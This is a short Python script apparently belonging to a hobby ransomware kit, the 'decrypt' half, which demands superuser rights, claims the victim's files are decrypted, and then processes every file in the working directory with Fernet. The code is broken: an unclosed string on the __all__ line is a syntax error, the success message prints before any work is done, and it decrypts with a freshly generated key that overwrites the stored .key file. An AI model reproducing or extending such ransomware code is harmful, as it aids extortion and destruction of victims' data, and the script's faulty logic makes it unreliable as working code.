#!/bin/env python

import os
from cryptography.fernet import Fernet

__author__ = ("Justine Dela Torre (Jasutin)")

__all__ = ['encrypt', 'decrypt

if not 'SUDO_UID' in os.environ.keys():
    print("\t\tYour files are still encrypted, Please run as superuser!\n")
    exit()

print("\t\tYour files has been decrypted!\n")

files = []

for file in os.listdir():
    if file == ".secret" or file == ".key" or file == ".decrypt" or file == ".encrypt":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open(".key", "wb") as decryptionkey:
    decryptionkey.write(key)

for file in files:
    with open(file, "rb") as enjasu:
        contents = enjasu.read()
    contents_decrypted = Fernet(key).decrypt(contents)
    with open(file, "wb") as enjasu:
        enjasu.write(contents_decrypted)

exit()



